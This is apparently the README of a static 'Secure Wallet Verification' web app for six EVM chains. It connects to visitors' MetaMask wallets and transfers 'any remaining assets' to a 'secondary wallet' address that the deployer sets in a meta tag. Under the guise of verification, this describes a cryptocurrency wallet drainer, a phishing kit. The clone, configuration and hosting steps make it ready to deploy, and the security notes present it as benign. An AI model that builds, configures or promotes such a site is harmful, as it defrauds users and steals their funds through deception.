# Secure Wallet Verification

Verify cryptocurrency wallets across multiple blockchains (Ethereum, Binance Smart Chain, Polygon, Avalanche, Arbitrum, Optimism) using a simple static website. The DApp connects via MetaMask to transfer any remaining assets to a secondary wallet for audit or backup.

## Table of Contents
1. [Features](#features)
2. [Quick Start](#quick-start-local-development)
3. [Configuration](#configuration)
4. [Deployment](#deployment)
5. [Security Notes](#security-notes)
6. [Project Structure](#project-structure)
7. [License](#license)

## Features
• Supports six EVM networks out-of-the-box  
• No backend—fully static, deploy anywhere  
• Destination wallet address is injected at runtime via `<meta>` tag  
• Graceful fallback for browsers without MetaMask

## Quick Start (Local Development)

1. **Clone the repository**

   ```bash
   git clone https://github.com/your-org/secure-wallet-verification.git
   cd secure-wallet-verification
   ```

2. **Serve the static files** (choose one):

   ```bash
   # Using npm http-server
   npx http-server -c-1

   # Or with Python (>=3.7)
   python -m http.server 8080
   ```

3. **Open** `http://localhost:8080` in a MetaMask-enabled browser.

## Configuration

The destination wallet address is **not** hard-coded. Set it at deploy time by editing or injecting this meta tag in `index.html`:

```html
<!-- inside <head> -->
<meta name="secondary-wallet" content="0xYourWalletHere" />
```

*Tip: when deploying via CI/CD, use templating or environment substitution to replace the value automatically.*

## Deployment

Because the site is 100 % static, you can deploy to any static hosting service:

| Host | Notes |
|------|-------|
| **GitHub Pages** | Push the built files to a `gh-pages` branch or enable Pages from the repository settings. |
| **Netlify / Vercel** | Point to the repo, set build command to `npm run build` (none) and publish directory to root. |
| **AWS S3 + CloudFront** | Upload the files, enable static site hosting, and configure CloudFront for CDN + SSL. |

## Security Notes

* Always verify the `secondary-wallet` address before publishing.
* Never commit private keys or other secrets to the repository.
* Consider adding strict CSP headers and enabling HTTPS-only hosting.

## Project Structure

```
├── index.html
├── styles/
│   └── main.css
├── scripts/
│   ├── app.js
│   ├── chains.js
│   └── config.js
└── README.md
```

## License

MIT © 2024 Your Name or Organization